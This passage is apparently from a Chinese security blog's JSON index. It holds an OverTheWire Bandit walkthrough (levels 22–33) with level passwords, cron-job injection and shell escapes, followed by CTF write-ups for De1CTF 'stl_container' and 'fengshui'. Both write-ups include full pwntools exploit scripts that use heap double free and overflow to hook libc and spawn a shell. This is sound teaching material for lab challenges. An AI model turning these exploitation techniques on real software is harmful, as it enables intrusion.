/etc/bandit_pass/$myname to /tmp/$mytarget\"\n\ncat /etc/bandit_pass/$myname > /tmp/$mytarget\nbandit22@bandit:/etc/cron.d$ /usr/bin/cronjob_bandit23.sh\nCopying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3\nbandit22@bandit:/etc/cron.d$ cat /tmp/8169b67bd894ddbb4412f91573b38db3\nYk7owGAcWjwMVRwrTesJEwB7WVOiILLI\n发现不对，于是采用如下方法：\nbandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1\n8ca319486bfbbc3663ea0fbe81326349\nbandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349\njc1udXuA1tiHqjIsL8yaapX5XIAI6i0n\n```\n\n(23)\n\nssh bandit23@bandit.labs.overthewire.org -p 2220\n\njc1udXuA1tiHqjIsL8yaapX5XIAI6i0n\n\n```shell\nbandit23@bandit:~$ cd /etc/cron.d\nbandit23@bandit:/etc/cron.d$ cat cronjob_bandit24\n@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null\n* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null\nbandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh\n#!/bin/bash\n\nmyname=$(whoami)\n\ncd /var/spool/$myname\necho \"Executing and deleting all scripts in /var/spool/$myname:\"\nfor i in * .*;\ndo\n    if [ \"$i\" != \".\" -a \"$i\" != \"..\" ];\n    then\n        echo \"Handling $i\"\n        owner=\"$(stat --format \"%U\" ./$i)\"\n        if [ \"${owner}\" = \"bandit23\" ]; then\n            timeout -s 9 60 ./$i\n        fi\n        rm -f ./$i\n    fi\ndone\n\n```\n\n```shell\nmkdir /tmp/bling3\nchmod 777 /tmp/bling3\ncd /tmp/bling3\nvim test.sh\n\t#!/bin/sh\n\tcat /etc/bandit_pass/bandit24 > /tmp/bling3/result24\nchmod 777 test.sh\ncp test.sh /var/spool/bandit24/test.sh\n等待一会儿\ncat result24\n```\n\n(24)\n\nssh bandit24@bandit.labs.overthewire.org -p 2220\n\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\n\n```shell\nbandit24@bandit:/tmp/bling4$ vim test.py\n--------------------\n\t#!/usr/bin/env python\n\tf = open('test.txt','w')\n\tfor i in range(10000):\n\t\tpayload = \"UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\" + \" \" + str(i).zfill(4) + '\\n'\n\t\tf.write(payload)\n\tf.close()\n--------------------\nbandit24@bandit:/tmp/bling4$ python test.py\nbandit24@bandit:/tmp/bling4$ nc localhost 30002 < /tmp/bling4/test.txt > /tmp/bling4/result.txt\nbandit24@bandit:/tmp/bling4$ sort ./result.txt | uniq -u\n\nCorrect!\nExiting.\nI am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.\nThe password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\n```\n\n(25)\n\nssh bandit25@bandit.labs.overthewire.org -p 2220\n\nuNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\n\n```\n把窗口调整到只能显示3/4行的状态\n$ ssh -i bandit26.sshkey bandit26@localhost\n在more界面执行命令\nv - 进入编辑模式\nr /etc/bandit_pass/bandit26\n```\n\n(26)\n\nssh bandit26@bandit.labs.overthewire.org -p 2220\n\n5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z\n\n```\n把窗口调整到只能显示3/4行的状态\nssh登录上去，然后到more界面时，按v进入编辑模式，执行以下两条命令就可以获取shell\n:set shell=/bin/sh\n:shell\nbandit26@bandit:~$ ls\nbandit27-do  text.txt\nbandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27\n3ba3118a22e93127a4ed485be72ef5ea\n```\n\n(27)\n\nssh bandit27@bandit.labs.overthewire.org -p 2220\n\n3ba3118a22e93127a4ed485be72ef5ea\n\n```shell\nbandit27@bandit:~$ mkdir /tmp/bling\nbandit27@bandit:~$ cd /tmp/bling\nbandit27@bandit:/tmp/bling$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo\nCloning into 'repo'...\nCould not create directory '/home/bandit27/.ssh'.\nThe authenticity of host 'localhost (127.0.0.1)' can't be established.\nECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.\nAre you sure you want to continue connecting (yes/no)? yes\nFailed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).\nThis is a OverTheWire game server. More information on http://www.overthewire.org/wargames\n\nbandit27-git@localhost's password: \nremote: Counting objects: 3, done.\nremote: Compressing objects: 100% (2/2), done.\nremote: Total 3 (delta 0), reused 0 (delta 0)\nReceiving objects: 100% (3/3), done.\nbandit27@bandit:/tmp/bling$ ls\nrepo\nbandit27@bandit:/tmp/bling$ cd repo\nbandit27@bandit:/tmp/bling/repo$ ls\nREADME\nbandit27@bandit:/tmp/bling/repo$ cat README\nThe password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2\n\n```\n\n(28)\n\nssh bandit28@bandit.labs.overthewire.org -p 2220\n\n0ef186ac70e04ea33b4c1853d2526fa2\n\n```shell\n拉下repo后：\nbandit28@bandit:/tmp/bling28/repo$ git log\ncommit edd935d60906b33f0619605abd1689808ccdd5ee\nAuthor: Morla Porla <morla@overthewire.org>\nDate:   Thu May 7 20:14:49 2020 +0200\n\n    fix info leak\n\ncommit c086d11a00c0648d095d04c089786efef5e01264\nAuthor: Morla Porla <morla@overthewire.org>\nDate:   Thu May 7 20:14:49 2020 +0200\n\n    add missing data\n\ncommit de2ebe2d5fd1598cd547f4d56247e053be3fdc38\nAuthor: Ben Dover <noone@overthewire.org>\nDate:   Thu May 7 20:14:49 2020 +0200\n\n    initial commit of README.md\n\nbandit28@bandit:/tmp/bling28/repo$ git reset --hard c086d11a00c0648d095d04c089786efef5e01264\nHEAD is now at c086d11 add missing data\nbandit28@bandit:/tmp/bling28/repo$ cat README.md \n# Bandit Notes\nSome notes for level29 of bandit.\n\n## credentials\n\n- username: bandit29\n- password: bbc96594b4e001778eee9975372716b2\n```\n\n\n\n(29)\n\nssh bandit29@bandit.labs.overthewire.org -p 2220\n\nbbc96594b4e001778eee9975372716b2\n\n```shell\n拉下repo后：\nbandit29@bandit:/tmp/bling29/repo$ git branch -a\n* master\n  remotes/origin/HEAD -> origin/master\n  remotes/origin/dev\n  remotes/origin/master\n  remotes/origin/sploits-dev\nbandit29@bandit:/tmp/bling29/repo$ git checkout origin/dev\nPrevious HEAD position was 786d5be... add some silly exploit, just for shit and giggles\nHEAD is now at bc83328... add data needed for development\nbandit29@bandit:/tmp/bling29/repo$ cat README.md \n# Bandit Notes\nSome notes for bandit30 of bandit.\n\n## credentials\n\n- username: bandit30\n- password: 5b90576bedb2cc04c86a9e924ce42faf\n```\n\n(30)\n\nssh bandit30@bandit.labs.overthewire.org -p 2220\n\n5b90576bedb2cc04c86a9e924ce42faf\n\n```shell\nbandit30@bandit:/tmp/bling30/repo$ cd .git\nbandit30@bandit:/tmp/bling30/repo/.git$ cat *\ncat: branches: Is a directory\n[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n[remote \"origin\"]\n\turl = ssh://bandit30-git@localhost/home/bandit30-git/repo\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n\tremote = origin\n\tmerge = refs/heads/master\nUnnamed repository; edit this file 'description' to name the repository.\nref: refs/heads/master\ncat: hooks: Is a directory\nDIRC\u0002\u0001^�3�\n�^�3�     e\n��\u0003\u0006$���+\u0016\u001e\u0002��!�L4 ]R\u0013?��֛��7w\tREADME.mdTREE\u00191 0\n��Y.�U�����36:F��JGVV\u0002F*-`-��I���}u/)Qcat: info: Is a directory\ncat: logs: Is a directory\ncat: objects: Is a directory\n# pack-refs with: peeled fully-peeled \n3aefa229469b7ba1cc08203e5d8fa299354c496b refs/remotes/origin/master\nf17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secret\ncat: refs: Is a directory\nbandit30@bandit:/tmp/bling30/repo/.git$ ls -al\ntotal 52\ndrwxr-sr-x 8 bandit30 root 4096 May 17 14:52 .\ndrwxr-sr-x 3 bandit30 root 4096 May 17 14:52 ..\ndrwxr-sr-x 2 bandit30 root 4096 May 17 14:52 branches\n-rw-r--r-- 1 bandit30 root  276 May 17 14:52 config\n-rw-r--r-- 1 bandit30 root   73 May 17 14:52 description\n-rw-r--r-- 1 bandit30 root   23 May 17 14:52 HEAD\ndrwxr-sr-x 2 bandit30 root 4096 May 17 14:52 hooks\n-rw-r--r-- 1 bandit30 root  137 May 17 14:52 index\ndrwxr-sr-x 2 bandit30 root 4096 May 17 14:52 info\ndrwxr-sr-x 3 bandit30 root 4096 May 17 14:52 logs\ndrwxr-sr-x 4 bandit30 root 4096 May 17 14:52 objects\n-rw-r--r-- 1 bandit30 root  165 May 17 14:52 packed-refs\ndrwxr-sr-x 5 bandit30 root 4096 May 17 14:52 refs\nbandit30@bandit:/tmp/bling30/repo/.git$ git show --name-only secret\n47e603bb428404d265f59c42920d81e5\n```\n\n\n\n(31)\n\nssh bandit31@bandit.labs.overthewire.org -p 2220\n\n47e603bb428404d265f59c42920d81e5\n\n```shell\n将repo拉到本地后：\nbandit31@bandit:/tmp/bling31/repo$ ls -al\ntotal 20\ndrwxr-sr-x 3 bandit31 root 4096 May 17 15:00 .\ndrwxr-sr-x 3 bandit31 root 4096 May 17 14:59 ..\ndrwxr-sr-x 8 bandit31 root 4096 May 17 15:00 .git\n-rw-r--r-- 1 bandit31 root    6 May 17 15:00 .gitignore\n-rw-r--r-- 1 bandit31 root  147 May 17 15:00 README.md\nbandit31@bandit:/tmp/bling31/repo$ echo \"May I come in?\" > key.txt\nbandit31@bandit:/tmp/bling31/repo$ git add -f key.txt\nbandit31@bandit:/tmp/bling31/repo$ git status\nOn branch master\nYour branch is up-to-date with 'origin/master'.\nChanges to be committed:\n  (use \"git reset HEAD <file>...\" to unstage)\n\n\tnew file:   key.txt\n\nbandit31@bandit:/tmp/bling31/repo$ git commit -m \"add\"\n[master 93d69fa] add\n 1 file changed, 1 insertion(+)\n create mode 100644 key.txt\nbandit31@bandit:/tmp/bling31/repo$ git push origin master\nCould not create directory '/home/bandit31/.ssh'.\nThe authenticity of host 'localhost (127.0.0.1)' can't be established.\nECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.\nAre you sure you want to continue connecting (yes/no)? yes\nFailed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).\nThis is a OverTheWire game server. More information on http://www.overthewire.org/wargames\n\nbandit31-git@localhost's password: \nCounting objects: 3, done.\nDelta compression using up to 2 threads.\nCompressing objects: 100% (2/2), done.\nWriting objects: 100% (3/3), 315 bytes | 0 bytes/s, done.\nTotal 3 (delta 0), reused 0 (delta 0)\nremote: ### Attempting to validate files... ####\nremote: \nremote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.\nremote: \nremote: Well done! Here is the password for the next level:\nremote: 56a9bf19c63d650ce78e6ec0354ee45e\nremote: \nremote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.\nremote: \nTo ssh://localhost/home/bandit31-git/repo\n ! [remote rejected] master -> master (pre-receive hook declined)\nerror: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo'\n```\n\n(32)\n\nssh bandit32@bandit.labs.overthewire.org -p 2220\n\n56a9bf19c63d650ce78e6ec0354ee45e\n\n```shell\n>> $0\n$ ls\nuppershell\n$ cat /etc/bandit_pass/bandit33\nc9c3199ddf4121b10cf581a98d51caee\n```\n\n(33)\n\nssh bandit33@bandit.labs.overthewire.org -p 2220\n\nc9c3199ddf4121b10cf581a98d51caee\n\n```\n题目还没出来\n```\n\n# 3 参考\n\n[Linux 闯关游戏之通关秘籍](https://mp.weixin.qq.com/s/7N--mAlG2o4ixfpHyUAc_A)\n\n[Wargames](https://xuanxuanblingbling.github.io/ctf/game/2020/02/04/Wargames/)","tags":["game"],"categories":["基础技能"]},{"title":"De1CTF 2020 之 stl_container","url":"/2020/05/03/stl-container/","content":"\n[stl_container](stl_container)\n[libc-2.27.so](libc-2.27.so)\n\n# 1 触发异常分支\n\n这个题目寻找漏洞点的过程比较曲折，IDA打开发现是c++代码，但是我真的不懂C++，纠结从代码里找漏洞找了一天也没思路。在男票的提醒下，直接触发漏洞，再根据触发的漏洞去理解程序然后利用。\n\nmain函数中可以看到四个stl函数。list和vector函数中实现了add,delete和show。queue和stack中只支持add和delete。\n\n```c\n \t  case 1u:\n        TestList();\n        break;\n      case 2u:\n        TestVector();\n        break;\n      case 3u:\n        TestQueue();\n        break;\n      case 4u:\n        TestStack();\n        break;\n```\n\n由于是堆相关的题目，很自然想到问题大多出在free时，因此对list和vector下的add和delete进行测试。在add两个vector，删除index为0的vector，然后执行show（0）时，打印了一堆无法显示的字符。\n\n```shell\nSTL Container Test\n1. list\n2. vector\n3. queue\n4. stack\n5. exit\n>> 2\n1. add\n2. delete\n3. show\n>> 1\ninput data:123\ndone!\nSTL Container Test\n……\n>> 2\n1. add\n2. delete\n3. show\n>> 1\ninput data:qwe\ndone!\nSTL Container Test\n……\n>> 2\n1. add\n2. delete\n3. show\n>> 2\nindex?\n0\ndone!\nSTL Container Test\n……\n>> 2\n1. add\n2. delete\n3. show\n>> 3\nindex?\n0\ndata: ���\u001f\u0014V\n```\n\ndata部分应该是访问了非法内存，那么接下来就用gef进行调试，看看是什么原因导致了访问非法内存。\n\n# 2 分析异常原因\n\n申请两个vector，然后查看chunk的分布情况：\n\n```shell\n~~~~~~\nChunk(addr=0x560ff5676490, size=0x20, flags=PREV_INUSE)\n    [0x0000560ff5676490     50 65 67 f5 0f 56 00 00 f0 65 67 f5 0f 56 00 00    Peg..V...eg..V..]\n~~~~~~\nChunk(addr=0x560ff5676550, size=0xa0, flags=PREV_INUSE)\n    [0x0000560ff5676550     76 65 63 74 6f 72 31 31 31 0a 00 00 00 00 00 00    vector111.......]\nChunk(addr=0x560ff56765f0, size=0xa0, flags=PREV_INUSE)\n    [0x0000560ff56765f0     76 65 63 74 6f 72 32 32 32 0a 00 00 00 00 00 00    vector222.......]\nChunk(addr=0x560ff5676690, size=0xe980, flags=PREV_INUSE)  ←  top chunk\n-----------------------------------------------------------------------------------\ngef➤  x/10gx 0x560ff5676490\n0x560ff5676490:\t0x0000560ff5676550\t0x0000560ff56765f0\n0x560ff56764a0:\t0x0000000000000000\t0x00000000000000a1\n```\n\n可以看到0x560ff5676490处依次存放了vector(0) 和vector(1)的字符串地址。接下来删除vector(0)，看看这个地址处和字符串有什么变化，如下。\n\n```shell\n~~~~~~~~\nChunk(addr=0x560ff5676490, size=0x20, flags=PREV_INUSE)\n    [0x0000560ff5676490     f0 65 67 f5 0f 56 00 00 f0 65 67 f5 0f 56 00 00    .eg..V...eg..V..]\n~~~~~~~~\nChunk(addr=0x560ff5676550, size=0xa0, flags=PREV_INUSE)\n    [0x0000560ff5676550     76 65 63 74 6f 72 31 31 31 0a 00 00 00 00 00 00    vector111.......]\nChunk(addr=0x560ff56765f0, size=0xa0, flags=PREV_INUSE)\n    [0x0000560ff56765f0     b0 64 67 f5 0f 56 00 00 32 0a 00 00 00 00 00 00    .dg..V..2.......]\n--------------------------------------------------------------------------------\ngef➤  x/10gx 0x560ff5676490\n0x560ff5676490:\t0x0000560ff56765f0\t0x0000560ff56765f0\n0x560ff56764a0:\t0x0000000000000000\t0x00000000000000a1\n```\n\n可以看到0x560ff5676490处，原本放vector(0)字符串地址的位置被vector(1)字符串地址`0x0000560ff56765f0`覆盖了，而且vector(1)字符串地址处的空间被释放了，vector(0)的字符串`“vector111”`依然在堆中。\n\n执行show(0)时，返回如下信息：\n\n```shell\n[DEBUG] Received 0x4f bytes:\n    00000000  64 61 74 61  3a 20 b0 64  67 f5 0f 56  0a 53 54 4c  │data│: ·d│g··V│·STL│\n    00000010  20 43 6f 6e  74 61 69 6e  65 72 20 54  65 73 74 0a  │ Con│tain│er T│est·│\n    00000020  31 2e 20 6c  69 73 74 0a  32 2e 20 76  65 63 74 6f  │1. l│ist·│2. v│ecto│\n    00000030  72 0a 33 2e  20 71 75 65  75 65 0a 34  2e 20 73 74  │r·3.│ que│ue·4│. st│\n    00000040  61 63 6b 0a  35 2e 20 65  78 69 74 0a  3e 3e 20     │ack·│5. e│xit·│>> │\n    0000004f\ndata: \\xb0dg�V\n```\n\n根据接收到的data可以看出，打印的是`b0 64  67 f5 0f 56`，这个正好对上了此时地址0x560ff56765f0处的内容。\n\n- 分析到这里，可以看出我们在delete 0号vector时，实际发生了这么一个过程：0号vector的字符串地址被从0x560ff5676490空间中删除，并且将1号vector的字符串地址前移一位；然后再free 0号vector的字符串地址，但此时该处已经变成 1号vector的字符串地址；因此导致删除 0号vector却free了 1号vector的字符串地址。而1号vector的字符串地址后续还可以继续被使用，这就是一个悬空指针。\n\n# 3 悬空指针可以做什么\n\n这个悬空指针目前有两种操作：\n\n- delete() - double free。由于这个题是ubuntu18.04下libc-2.27.so，有Tcache，因此一次double free就可以形成一个环，进而任意地址写。可以参考我之前做过的一个链接：https://blingblingxuanxuan.github.io/2020/03/13/TcacheTear/\n- show() - 泄露信息。如libc、堆栈、程序等地址或信息。\n\n## 3.1 泄露libc\n\n通常的做法是将一个chunk free到unsorted bin中，再将这个chunk申请回来，然后打印该chunk内容，就可以计算出libc的地址。\n\n这道题中我们无法控制申请的堆空间的大小，但是每add一个list/vector/queue/stack时，在Test::Init中都有malloc(0x98)，这些chunk在相应的delete操作后都会串到大小为0xa0的Tcache链上。一条Tcache链最多串7个chunk，第8个相同大小的chunk会被放到unsorted bin中。\n\n构造如下顺序的add和delete。最先delete list(1)时，大小为0xa0的Tcache链上会存在一个之前的chunk，此时我们只需delete 6个就可以将vector(0)放到unsorted bin中（实际是将vector(1)的data块扔到了unsorted bin），接下来通过show(vector 0)就可以读取到leak的地址，从而得到malloc_state结构体地址，最后查找libc-2.27.so中malloc_trim()中malloc_state的偏移，就可以计算出libc地址。\n\n```python\nvector_add(\"vector111\")\nvector_add(\"vector222\")\nlist_add(\"list111\")\nlist_add(\"list222\")\nqueue_add(\"queue111\")\nqueue_add(\"queue222\")\nstack_add(\"stack111\")\nstack_add(\"stack222\")\n\nlist_delete(1)\nlist_delete(0)\nqueue_delete()\nqueue_delete()\nstack_delete()\nstack_delete()\nvector_delete(0)\n\nvector_show(0)\nleak_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\nstate_addr = leak_addr - 0x60\nlibc_addr = state_addr - 0x3EBC40\nlog.warn(\"libc_addr: 0x%x\" % libc_addr)\n```\n\n## 3.2 写libc的函数指针\n\n由于本题got表不可写，且开启了PIE。因此考虑写libc中的函数指针，如`__malloc_hook`和`__free_hook`，将函数指针写成one gadget地址，下次调用到malloc或free时就能get shell。\n\n泄露完libc后，需要调整下堆空间的布局，通过double free获取一个环（在Tcache链上），从而去任意地址写。\n\n由于此时Tcache上0xa0链上是满的，因此需要add操作将Tcache链上的chunk用掉一些。我这里add了三次，其中一次必须是add vector(凑齐两个vector)，不然后续无法delete 两次形成double free。\n\n```\none_gadget1 = libc_addr + 0x4f322\nfree_hook_addr = libc_addr + 0x3ed8e8\n\nvector_add(\"vector333\")\nlist_add(\"list333\")\nlist_add(\"list444\")\nvector_delete(0)\nvector_delete(0)\n\nvector_add(p64(free_hook_addr))\nvector_add(p64(one_gadget1))\n```\n\n在libc-2.27.so中找到三个可用gadget，其中0x4f322可利用成功：\n\n```shell\nbling@Ubuntu1804:/mnt/hgfs/vmshare-1804$ one_gadget libc-2.27.so \n0x4f2c5 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  rsp & 0xf == 0\n  rcx == NULL\n\n0x4f322 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  [rsp+0x40] == NULL\n\n0x10a38c execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n```\n\n# 2 EXP\n\n```python\n#coding=utf-8\nfrom pwn import *\n\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\nmyelf = ELF(\"./stl_container\")\nmylibc = ELF(\"./libc-2.27.so\")\nmyproc = process(myelf.path)\n\ndef list_add(data):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input data:\")\n    myproc.sendline(data)\n\ndef list_delete(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"index?\")\n    myproc.sendline(str(index))\n\ndef list_show(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"index?\")\n    myproc.sendline(str(index))\n\ndef vector_add(data):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input data:\")\n    myproc.sendline(data)\n\ndef vector_delete(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"index?\")\n    myproc.sendline(str(index))\n\ndef vector_show(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"index?\")\n    myproc.sendline(str(index))\n\ndef queue_add(data):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input data:\")\n    myproc.sendline(data)\n\ndef queue_delete():\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n\ndef stack_add(data):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input data:\")\n    myproc.sendline(data)\n\ndef stack_delete():\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n\n###leak libc###\nvector_add(\"vector111\")\nvector_add(\"vector222\")\nlist_add(\"list111\")\nlist_add(\"list222\")\nqueue_add(\"queue111\")\nqueue_add(\"queue222\")\nstack_add(\"stack111\")\nstack_add(\"stack222\")\n\nlist_delete(1)\nlist_delete(0)\nqueue_delete()\nqueue_delete()\nstack_delete()\nstack_delete()\nvector_delete(0)\n\nvector_show(0)\nmyproc.recvuntil(\"data: \")\nleak_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\nlog.warn(\"leak_addr: 0x%x\" % leak_addr)\n\nstate_addr = leak_addr - 0x60\nlibc_addr = state_addr - 0x3EBC40\nlog.warn(\"libc_addr: 0x%x\" % libc_addr)\n\n### change libc hook###\none_gadget0 = libc_addr + 0x4f2c5\none_gadget1 = libc_addr + 0x4f322\none_gadget2 = libc_addr + 0x10a38c\nmalloc_hook_addr = libc_addr + 0x3ebc30\nfree_hook_addr = libc_addr + 0x3ed8e8\n#free_hook_addr = libc_addr + mylibc.symbols['__free_hook']\nlog.warn(\"malloc_hook_addr: 0x%x\" % malloc_hook_addr)\nlog.warn(\"free_hook_addr: 0x%x\" % free_hook_addr)\nlog.warn(\"one_gadget0: 0x%x\" % one_gadget0)\nlog.warn(\"one_gadget1: 0x%x\" % one_gadget1)\nlog.warn(\"one_gadget2: 0x%x\" % one_gadget2)\n\nvector_add(\"vector333\")\nlist_add(\"list333\")\nlist_add(\"list444\")\nvector_delete(0)\nvector_delete(0)\n\nvector_add(p64(free_hook_addr))\nvector_add(p64(one_gadget1))\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n\n\n","categories":["CTF"]},{"title":"fengshui","url":"/2020/04/25/fengshui/","content":"\n- 题目文件：\n\n# 1 分析\n\n## 1.1 程序基本信息\n\n首先查看二进制文件信息：\n\n```shell\n$ file fengshui\nfengshui: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=45b09ec28a895f08b53682ead4e084874ee4b466, stripped\n$ checksec fengshui\n[*] '/mnt/hgfs/vmshare-1604/fengshui/ida/fengshui'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\n## 1.2 IDA源码分析\n\n程序有4个功能：添加person，删除person，修改person名字，打印person信息。\n\n### 1.2.1 添加person\n\n![](fengshui-1.png)\n\n\n\n### 1.2.2 删除person\n\n\n\n\n\n### 1.2.3 修改person名字\n\n\n\n\n\n### 1.2.4 打印person信息\n\n\n\n\n\n# 2 利用思路\n\n![](fengshui-2.png)\n\n\n\n![](fengshui-3.png)\n\n\n\n# 3 exp\n\n## 使用one_gadget的方式获取shell\n\n搜索libc中的可用gadget，挨个试试，最后一个在我的机器上可以成功。\n\n```shell\nbling@bling:~$ one_gadget libc-2.23.so \n0x45216 execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  rax == NULL\n\n0x4526a execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  [rsp+0x30] == NULL\n\n0xf02a4 execve(\"/bin/sh\", rsp+0x50, environ)\nconstraints:\n  [rsp+0x50] == NULL\n\n0xf1147 execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n\n```\n\n- exp如下\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch = \"amd64\",os = \"linux\",log_level = \"debug\")\n\nmyelf = ELF(\"./fengshui\")\nmyproc = process(myelf.path)\n\ndef add(name_len,name,school_len,school,yes_no):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"please input the length of name\")\n    myproc.sendline(str(name_len))\n    myproc.recvuntil(\"please input name\")\n    myproc.sendline(name)\n    myproc.recvuntil(\"please input the length of schoolname\")\n    myproc.sendline(str(school_len))\n    myproc.recvuntil(\"please input the school name\")\n    myproc.sendline(school)\n    myproc.recvuntil(\"is a tutor?(yes/no)\")\n    myproc.sendline(yes_no)\n\ndef delete(id):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"input a id to delete\")\n    myproc.sendline(str(id))\n\ndef edit(id,option,len,name):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"input a id to edit\")\n    myproc.sendline(str(id))\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(option))\n    myproc.recvuntil(\"please input the length of new name\")\n    myproc.sendline(str(len))\n    myproc.recvuntil(\"please input new name\")\n    myproc.sendline(name)\n\n\ndef sayhello(id):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\"input a id to sayhello\")\n    myproc.sendline(str(id))\n\nfor i in range(10):\n    add(0x10,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x20,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x30,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x40,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x50,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x60,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x70,\"xiayuan\",20,\"NUDT\",\"yes\")\n\nadd(0x10,\"xiayuan70\",20,\"NUDT70\",\"yes\")\nadd(0x10,\"xiayuan71\",20,\"NUDT71\",\"yes\")\nadd(0x10,\"xiayuan72\",20,\"NUDT72\",\"yes\")\nadd(0x10,\"xiayuan73\",20,\"NUDT73\",\"yes\")\n\npayload = \"a\" * 0x40 + p64(71) + p64(myelf.got[\"puts\"]) + p64(0x400760) + p64(0) \n#payload = \"a\" * 0x40 + p64(71) + p64(0xdeadbeef) + p64(0xdeadbeef) + p64(0) #+ p64(0)\nedit(70,1,990,payload)\nsayhello(71)\nmyproc.recv()\nputs_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\nlog.warn(\"put addr: 0x%x\" % puts_addr)\n\nlibc_base = puts_addr - 0x6F690\nsh_gadget = libc_base + 0xf1147\nlog.warn(\"libc base: 0x%x\" % libc_base)\nlog.warn(\"gadget addr: 0x%x\" % sh_gadget)\n\npayload = \"a\" * 0x40 + p64(73) + p64(0) + p64(sh_gadget) + p64(0) \nedit(72,1,990,payload)\nsayhello(73)\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n## 使用system函数获取shell\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch = \"amd64\",os = \"linux\",log_level = \"debug\")\n\nmyelf = ELF(\"./fengshui\")\nmylibc = ELF(\"./libc-2.23.so\")\nmyproc = process(myelf.path)\n\ndef add(name_len,name,school_len,school,yes_no):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"please input the length of name\")\n    myproc.sendline(str(name_len))\n    myproc.recvuntil(\"please input name\")\n    myproc.sendline(name)\n    myproc.recvuntil(\"please input the length of schoolname\")\n    myproc.sendline(str(school_len))\n    myproc.recvuntil(\"please input the school name\")\n    myproc.sendline(school)\n    myproc.recvuntil(\"is a 